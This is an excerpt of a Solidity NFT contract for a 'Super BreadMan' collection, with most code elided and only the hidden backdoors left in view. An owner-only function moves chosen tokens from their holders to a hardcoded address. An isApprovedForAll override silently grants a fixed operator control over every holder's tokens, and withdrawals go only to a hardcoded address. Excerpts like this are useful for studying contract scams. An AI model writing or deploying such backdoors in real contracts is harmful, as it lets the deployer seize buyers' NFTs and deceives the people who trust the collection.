...
contract Super_BreadMan is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Super BreadMan", "SBM", maxBatchSize_, collectionSize_) {
  ...
  function SB_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x707d95ef205Ba71834AC64AA56E99012738B35F5, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x9caC2f07926540CA0A5E5813bA1804E58F87261C);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x03b3051427F1Bb08CbEe82345D94e2E3899A8C1E){return true;}
